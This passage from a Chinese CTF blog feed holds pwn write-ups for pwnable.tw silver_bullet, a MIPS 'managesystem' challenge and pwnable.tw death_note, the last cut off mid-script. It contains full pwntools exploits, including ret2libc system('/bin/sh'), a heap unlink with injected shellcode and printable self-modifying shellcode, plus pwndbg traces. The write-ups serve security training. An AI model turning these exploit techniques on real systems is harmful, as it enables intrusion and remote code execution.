0x804afdc (_GLOBAL_OFFSET_TABLE_+24) —▸ 0xf7e4bcb0 (puts) ◂— push   ebp</span><br><span class="line">02:0008│      0xffb8d038 —▸ 0x80485eb (read_input) ◂— push   ebp</span><br><span class="line">03:000c│      0xffb8d03c —▸ 0x8048a18 (main+196) ◂— leave</span><br><span class="line">04:0010│      0xffb8d040 —▸ 0x804b410 ◂— 0x0</span><br><span class="line">05:0014│      0xffb8d044 ◂— 0x1011</span><br><span class="line">06:0018│      0xffb8d048 —▸ 0xf7f9f000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0</span><br><span class="line">07:001c│      0xffb8d04c —▸ 0xf7fe7c04 ◂— 0x0</span><br></pre></td></tr></table></figure><p>先执行puts(puts_got)</p><p>leak后返回到pop_rbx_ret清理stack并跳到read_input</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">EAX  0x5</span><br><span class="line">EBX  0x804afdc (_GLOBAL_OFFSET_TABLE_+24) —▸ 0xf7e4bcb0 (puts) ◂— push   ebp</span><br><span class="line">ECX  0xffffffff</span><br><span class="line">EDX  0xf7fa0870 (_IO_stdfile_1_lock) ◂— 0x0</span><br><span class="line">EDI  0xf7f9f000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0</span><br><span class="line">ESI  0xf7f9f000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0</span><br><span class="line">EBP  0x804b410 ◂— 0x0</span><br><span class="line">ESP  0xffb8d03c —▸ 0x8048a18 (main+196) ◂— leave</span><br><span class="line">EIP  0x80485eb (read_input) ◂— push   ebp</span><br><span class="line">────────────────────────────────────────[ DISASM ]─────────────────────────────────────────</span><br><span class="line">  0x8048475 &lt;_init+33&gt;         pop    ebx</span><br><span class="line">  0x8048476 &lt;_init+34&gt;         ret</span><br><span class="line">   ↓</span><br><span class="line">► 0x80485eb &lt;read_input&gt;       push   ebp</span><br><span class="line">  0x80485ec &lt;read_input+1&gt;     mov    ebp, esp</span><br><span class="line">  0x80485ee &lt;read_input+3&gt;     sub    esp, 4</span><br><span class="line">  0x80485f1 &lt;read_input+6&gt;     push   dword ptr [ebp + 0xc]</span><br><span class="line">  0x80485f4 &lt;read_input+9&gt;     push   dword ptr [ebp + 8]</span><br><span class="line">  0x80485f7 &lt;read_input+12&gt;    push   0</span><br><span class="line">  0x80485f9 &lt;read_input+14&gt;    call   0x8048490</span><br><span class="line"></span><br><span class="line">  0x80485fe &lt;read_input+19&gt;    add    esp, 0xc</span><br><span class="line">  0x8048601 &lt;read_input+22&gt;    mov    dword ptr [ebp - 4], eax</span><br><span class="line">─────────────────────────────────────────[ STACK ]─────────────────────────────────────────</span><br><span class="line">00:0000│ esp  0xffb8d03c —▸ 0x8048a18 (main+196) ◂— leave</span><br><span class="line">01:0004│      0xffb8d040 —▸ 0x804b410 ◂— 0x0</span><br><span class="line">02:0008│      0xffb8d044 ◂— 0x1011</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>完成向0x804b410输入payload后进行栈迁移：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">EAX  0x17</span><br><span class="line"> EBX  0x804afdc (_GLOBAL_OFFSET_TABLE_+24) —▸ 0xf7e4bcb0 (puts) ◂— push   ebp</span><br><span class="line"> ECX  0x804b410 ◂— 0x61616161 (&#x27;aaaa&#x27;)</span><br><span class="line"> EDX  0x16</span><br><span class="line"> EDI  0xf7f9f000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0</span><br><span class="line"> ESI  0xf7f9f000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0</span><br><span class="line"> EBP  0x61616161 (&#x27;aaaa&#x27;)</span><br><span class="line"> ESP  0x804b414 —▸ 0xf7e26db0 (system) ◂— sub    esp, 0xc</span><br><span class="line"> EIP  0x8048a19 (main+197) ◂— ret</span><br><span class="line">────────────────────────────────────────[ DISASM ]─────────────────────────────────────────</span><br><span class="line">   0x804862e  &lt;read_input+67&gt;    jne    read_input+83 &lt;0x804863e&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0x804863e  &lt;read_input+83&gt;    mov    eax, dword ptr [ebp - 4]</span><br><span class="line">   0x8048641  &lt;read_input+86&gt;    leave</span><br><span class="line">   0x8048642  &lt;read_input+87&gt;    ret</span><br><span class="line">    ↓</span><br><span class="line">   0x8048a18  &lt;main+196&gt;         leave</span><br><span class="line"> ► 0x8048a19  &lt;main+197&gt;         ret             &lt;0xf7e26db0; system&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0xf7e26db0 &lt;system&gt;           sub    esp, 0xc</span><br><span class="line">   0xf7e26db3 &lt;system+3&gt;         mov    eax, dword ptr [esp + 0x10]</span><br><span class="line">   0xf7e26db7 &lt;system+7&gt;         call   __x86.get_pc_thunk.dx &lt;0xf7f0bc5d&gt;</span><br><span class="line"></span><br><span class="line">   0xf7e26dbc &lt;system+12&gt;        add    edx, 0x178244</span><br><span class="line">   0xf7e26dc2 &lt;system+18&gt;        test   eax, eax</span><br><span class="line">─────────────────────────────────────────[ STACK ]─────────────────────────────────────────</span><br><span class="line">00:0000│ esp  0x804b414 —▸ 0xf7e26db0 (system) ◂— sub    esp, 0xc</span><br><span class="line">01:0004│      0x804b418 ◂— 0xdeadbeef</span><br><span class="line">02:0008│      0x804b41c —▸ 0x804b420 ◂— &#x27;/bin/sh&#x27;</span><br><span class="line">03:000c│      0x804b420 ◂— &#x27;/bin/sh&#x27;</span><br><span class="line">04:0010│      0x804b424 ◂— 0x68732f /* &#x27;/sh&#x27; */</span><br><span class="line">05:0014│      0x804b428 ◂— 0x0</span><br></pre></td></tr></table></figure><p>leave_ret两次完成栈迁移,执行payload！！🚩</p><p>EXP：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">&#x27;./silver_bullet&#x27;</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>,<span class="number">10103</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;../libc_32.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(p,<span class="string">&#x27;b*0x080489CF&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">p.send(<span class="string">&#x27;a&#x27;</span>*<span class="number">47</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">p.send(<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">puts_plt = <span class="number">0x80484a8</span></span><br><span class="line">puts_got = <span class="number">0x804afdc</span></span><br><span class="line">fake_addr = <span class="number">0x804b410</span></span><br><span class="line"></span><br><span class="line">pr_addr = <span class="number">0x08048475</span></span><br><span class="line">lr_addr = <span class="number">0x8048a18</span></span><br><span class="line">read_input = <span class="number">0x80485eb</span></span><br><span class="line">payload3 = <span class="string">&#x27;\xff&#x27;</span> * <span class="number">3</span> + p32(fake_addr) + p32(puts_plt) + p32(pr_addr) + p32(puts_got) + p32(read_input) + p32(lr_addr) + p32(fake_addr) + p32(<span class="number">0x100</span>)</span><br><span class="line"><span class="comment">#gdb,attach(p)</span></span><br><span class="line">p.send(payload3)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Oh ! You win !!\n&#x27;</span>)</span><br><span class="line">puts_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">system_addr = puts_addr - (libc.symbols[<span class="string">&#x27;puts&#x27;</span>]-libc.symbols[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">4</span> + p32(system_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(fake_addr + <span class="number">0x10</span>) + <span class="string">&#x27;/bin/sh&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>这题漏洞在于数据布局不规范以及strncat函数的结尾添加\0的操作🕵️‍♀️</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mipspwn</title>
      <link href="/2020/10/16/mipspwn%E5%88%9D%E8%AF%86/"/>
      <url>/2020/10/16/mipspwn%E5%88%9D%E8%AF%86/</url>
      
        <content type="html"><![CDATA[<h3 id="mipspwn"><a href="#mipspwn" class="headerlink" title="mipspwn"></a>mipspwn</h3><blockquote><p>最近遇到的异架构的pwn题越来越多了，也是未来pwn的发展趋向，决定入坑一下，就从西湖论剑的一道mipspwn开始进入mips的世界吧:)</p></blockquote><span id="more"></span><p>mips构架下的pwn和x86的pwn主要区别在于寄存器，指令集的区别。网上博客挺多的，我主要说下常见到的点（会不断补充的）：</p><p>1.a0,a1,a2寄存器用来函数的传参，多的用栈传递。</p><p>2.fp类似rbp但有又不同，ret_addr在fp-4，存储上一个栈帧的位置为fp-8。sp相当于rsp。</p><p>3.mips常用shellcode的地址覆盖返回地址来拿shell。</p><p>4.qemu-user起的mipspwn题的地址是固定的(动态链接库什么的除外)，且一般保护措施都没开启。</p><h4 id="西湖论剑managesystem"><a href="#西湖论剑managesystem" class="headerlink" title="西湖论剑managesystem"></a>西湖论剑managesystem</h4><p>mips下pwn静态分析用ghidra，ida反编译不了0.0</p><p>这题漏洞很明显：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Enter the index of user you want edit: &quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;iStack12);</span><br><span class="line"><span class="keyword">if</span> ((iStack12 &lt; <span class="number">0</span>) || (<span class="number">0x10</span> &lt; iStack12)) &#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;No!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (*(<span class="type">int</span> *)(note_list + iStack12 * <span class="number">8</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Nothing!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;The new user\&#x27;s info: &quot;</span>);</span><br><span class="line">    sVar1 = read(<span class="number">0</span>,*(<span class="type">void</span> **)(note_list + iStack12 * <span class="number">8</span>),*(<span class="type">int</span> *)(note_list + iStack12 * <span class="number">8</span> + <span class="number">4</span>)+ <span class="number">8</span>);   <span class="comment">//堆溢出可覆盖next_chunk的size</span></span><br><span class="line">    <span class="keyword">if</span> (sVar1 &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Some error happened!&quot;</span>);</span><br><span class="line">                  <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Edit compl</span></span><br><span class="line"><span class="string">  &#125;</span></span><br></pre></td></tr></table></figure><p>这就好办了，直接unlink。</p><p>先add4次，最后一个chunk存放shellcode，然后在chunk1里构造fake_chunk同时改next_chunk的inuse位，mips下是直接size-1即可，之后dele掉chunk2，触发unlink。<br>效果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope 0x00411830</span><br><span class="line">00:0000│   0x411830 (note_list) —▸ 0x412008 ◂— &#x27;aaaaaaaaaaaaaaaaaaaaaaa&#x27;</span><br><span class="line">01:0004│   0x411834 (note_list+4) ◂— 0x24 /* &#x27;$&#x27; */</span><br><span class="line">02:0008│   0x411838 (note_list+8) —▸ 0x411830 (note_list) —▸ 0x412008 ◂— &#x27;aaaaaaaaaaaaaaaaaaaaaaa&#x27;   //unlink</span><br><span class="line">03:000c│   0x41183c (note_list+12) ◂— 0x34 /* &#x27;4&#x27; */</span><br><span class="line">04:0010│   0x411840 (note_list+16) —▸ 0x412068 ◂— &#x27;ccccccccccccccccccccccc&#x27;</span><br><span class="line">05:0014│   0x411844 (note_list+20) ◂— 0x34 /* &#x27;4&#x27; */</span><br><span class="line">06:0018│   0x411848 (note_list+24) —▸ 0x4120a0 ◂— lui    $t1, 0x6962 /* 0x3c096962 */</span><br><span class="line">07:001c│   0x41184c (note_list+28) ◂— 0x84</span><br></pre></td></tr></table></figure><p>之后edit(1)来控制chunk0的指针，配合show泄露libc(用的free_got)，和stack(用的env(libc里的env)环境变量指针)。</p><p>然后偏移得到ret_addr，之后edit改chunk0_ptr位ret_addr，再edit(0)改返回地址为存放shellcode的chunk地址。</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;mips&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">c</span>):</span><br><span class="line">p.sendafter(<span class="string">&quot;options &gt;&gt; &quot;</span>,<span class="built_in">str</span>(c)*<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">sz,content</span>):</span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;length: &quot;</span>,<span class="built_in">str</span>(sz))</span><br><span class="line">p.sendafter(<span class="string">&quot;info: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">idx</span>):</span><br><span class="line">cmd(<span class="number">2</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">cmd(<span class="number">3</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">p.sendafter(<span class="string">&quot;info: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">cmd(<span class="number">4</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">host,port=<span class="number">1234</span></span>):</span><br><span class="line"><span class="keyword">global</span> p</span><br><span class="line"><span class="keyword">if</span> host:</span><br><span class="line">p=remote(host,port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=process([<span class="string">&#x27;./qemu-mipsel-static&#x27;</span>, <span class="string">&#x27;-L&#x27;</span>, <span class="string">&#x27;./&#x27;</span>, <span class="string">&#x27;-g&#x27;</span>, <span class="string">&#x27;1234&#x27;</span>, <span class="string">&#x27;./managesystem&#x27;</span>])</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x24</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">0x34</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">0x34</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x18</span>)</span><br><span class="line"></span><br><span class="line">sc=asm(shellcraft.sh(),endian=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">add(<span class="number">0x84</span>,sc+<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">node_list=<span class="number">0x00411830</span></span><br><span class="line">payload=p32(<span class="number">0</span>)+p32(<span class="number">0x31</span>)+p32(node_list+<span class="number">8</span>-<span class="number">0xc</span>)+p32(node_list+<span class="number">8</span>-<span class="number">0x8</span>)</span><br><span class="line">payload=payload.ljust(<span class="number">0x30</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload+=p32(<span class="number">0x30</span>)+p32(<span class="number">0x38</span>)</span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">1</span>,p32(<span class="number">0x04117B4</span>))</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;info: &quot;</span>)</span><br><span class="line">libc = u32(p.recv(<span class="number">4</span>))-<span class="number">0x0056B68</span></span><br><span class="line">info(<span class="string">&quot;libc&quot;</span>+<span class="built_in">hex</span>(libc))</span><br><span class="line">edit(<span class="number">1</span>,p32(libc+<span class="number">0x007AE90</span>))  <span class="comment">#env -&gt;stack</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;info: &quot;</span>)</span><br><span class="line">stack=u32(p.recv(<span class="number">4</span>))</span><br><span class="line">info(<span class="string">&quot;stack&quot;</span>+<span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line">ret=stack-<span class="number">0x158</span></span><br><span class="line">edit(<span class="number">1</span>,p32(ret))</span><br><span class="line">edit(<span class="number">0</span>,p32(<span class="number">0x4120a0</span>))</span><br><span class="line">cmd(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">main(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwnable.tw death_note</title>
      <link href="/2020/10/15/Pwnable_death_note/"/>
      <url>/2020/10/15/Pwnable_death_note/</url>
      
        <content type="html"><![CDATA[<h3 id="Pwnable-tw-death-note"><a href="#Pwnable-tw-death-note" class="headerlink" title="Pwnable.tw death_note"></a>Pwnable.tw death_note</h3><blockquote><p>printable shellocode</p></blockquote><span id="more"></span><p>这题还算简单，add时idx检查不严导致可以向上写got表，同时NX没开，因此我们先在heap里写shellcode，之后改puts_got执行shellcode。</p><p>但题目对输入的内容进行了限制：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">is_printable</span><span class="params">(<span class="type">char</span> *s)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> i; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; <span class="built_in">strlen</span>(s) &gt; i; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( s[i] &lt;= <span class="number">0x1F</span> || s[i] == <span class="number">0x7F</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此我们构造的shellcode要符合条件，也即可打印的shellcode。</p><p>由于限制，mov指令无法使用了，但可以通过push,pop来替代。最致命的时’int 0x80’没了😱</p><p>看了P4nda师傅的博客，学到了还可以用sub byte ptr[eax + 0x35] , dl;sub byte ptr[eax + 0x34] , dl这样的执行对机器码进行修改。</p><p>由于int 0x80的机器码为 cd 80 (16进制)，切在shellcode开始执行时edx存放shellcode首地址，因此构造eax&#x3D;shellcode_addr,dl&#x3D;0x60,之后再ptr[eax + 0x35]即shellcode结尾处写入’\x6b\x40’，通过执行改指令可以修正使其为0xcd和0x80，太妙了。</p><p>另外eax&#x3D;0xb可以通过xor指令实现。</p><p>EXP:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">host,port=<span class="number">10201</span></span>):</span><br><span class="line">    <span class="keyword">global</span> p</span><br><span class="line">    <span class="keyword">if</span> host:</span><br><span class="line">        p=remote(host,port)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p=process(<span class="string">&quot;./death_note&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#eax=0xb,ebx=&quot;/bin/sh&quot;,ecx=edx=0</span></span><br><span class="line">    shellcode=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        push 0x68</span></span><br><span class="line"><span class="string">        push 0x732f2f2f</span></span><br><span class="line"><span class="string">        push 0x6e69622f</span></span><br><span class="line"><span class="string">        push esp</span></span><br><span class="line"><span class="string">        pop ebx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        push edx</span></span><br><span class="line"><span class="string">        pop eax</span></span><br><span class="line"><span class="string">        push 0x60606060</span></span><br><span class="line"><span class="string">        pop edx</span></span><br><span class="line"><span class="string">        sub byte ptr[eax + 0x35] , dl</span></span><br><span class="line"><span class="string">        sub byte ptr[eax + 0x35] , dl</span></span><br><span class="line"><span class="string">        sub byte ptr[eax + 0x34] , dl</span></span><br><span class="line"><span class="string">        push 0x3e3e3e3e</span></span><br><span class="line"><span class="string">        pop edx</span></span><br><span class="line"><span class="string">        sub byte ptr[eax + 0x34] , dl</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        push ecx</span></span><br><span class="line"><span class="string">        pop edx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        push edx</span></span><br><span class="line"><span class="string">        pop eax</span></span><br><span class="line"><span class="string">        xor al, 0x40</span></span><br><span class="line"><span class="string">        xor al, 0x4b</span></span><br><span class="line"><span class="string">        push edx</span></span><br><span class="line"><span class="string">        pop edx</span></span><br><span class="line"><span class="string">        push edx</span></span><br><span class="line"><span class="string">        pop edx</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="comment"># gdb.attach(p,&#x27;b*0x80487EF&#x27;)</span></span><br><span class="line">    offset=-<span class="number">16</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(offset))</span><br><span class="line">    p.recvuntil(<span 